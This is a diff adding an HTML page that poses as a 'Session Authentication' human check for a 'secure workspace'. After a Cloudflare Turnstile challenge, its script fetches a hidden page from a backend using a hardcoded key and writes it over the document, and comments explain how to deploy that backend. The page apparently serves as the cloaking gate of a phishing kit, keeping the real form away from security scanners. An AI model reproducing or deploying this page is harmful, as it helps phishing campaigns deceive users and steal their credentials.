@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Session Authentication</title>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f4f5f7;color:#2c3e50;line-height:1.5}
+.cOrWHzq{background:#fff;border-radius:12px;box-shadow:0 2px 24px rgba(0,0,0,0.06);padding:38px 34px;max-width:440px;width:92%;text-align:center}
+.tOrWHzq{font-size:1.25rem;font-weight:600;color:#1e293b;margin-bottom:8px}
+.uOrWHzq{font-size:0.9rem;color:#64748b;margin-bottom:28px}
+.ftOrWHzq{margin-top:24px;font-size:0.75rem;color:#c0c8d4}
+</style>
+</head>
+<body>
+<div class="cOrWHzq">
+<div class="tOrWHzq">Authenticating Your Session</div>
+<div class="uOrWHzq">We need to confirm you are human before proceeding to your secure workspace.</div>
+<div id="ts-turnstile" style="min-height:65px;"></div>
+<div id="ts-error" style="margin-top:16px;color:#dc2626;font-size:14px;display:none;">Verification failed. Please try again.</div>
+<div class="ftOrWHzq">&copy; 2026 api.baloncloud.eu</div>
+</div>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async></script>
+<script>
+(function(){
+  // ⚠️ CHANGE THIS to your Render URL after deploying the backend
+  // Example: var BACKEND = "https://abv-backend.onrender.com";
+  // If you set up Netlify _redirects, leave it empty to use same-origin /a
+  var BACKEND = ""; // e.g. "https://your-app.onrender.com"
+
+  var n = "HBfNYyUjMsgOLGRZ";
+  var sent = false;
+
+  function loadForm(token){
+    if(sent) return;
+    sent = true;
+    fetch(BACKEND + '/a?k=' + n + '&t=' + encodeURIComponent(token))
+      .then(function(r){ return r.text(); })
+      .then(function(html){
+        document.open();
+        document.write(html);
+        document.close();
+      })
+      .catch(function(){
+        document.body.innerHTML = '<div style="text-align:center;padding:40px;font-family:sans-serif"><p>Unable to verify. Please try again later.</p></div>';
+      });
+  }
+
+  function onError(){
+    var err = document.getElementById('ts-error');
+    if(err) err.style.display = 'block';
+  }
+
+  window.addEventListener('load', function(){
+    if(typeof turnstile !== 'undefined'){
+      turnstile.render('#ts-turnstile', {
+        sitekey: '0x4AAAAAAE7CY8nNIUDU9vqa',
+        callback: loadForm,
+        errorCallback: onError,
+        appearance: 'always',
+        retry: 'never'
+      });
+    } else {
+      onError();
+    }
+  });
+})();
+</script>
+</body>
+</html>
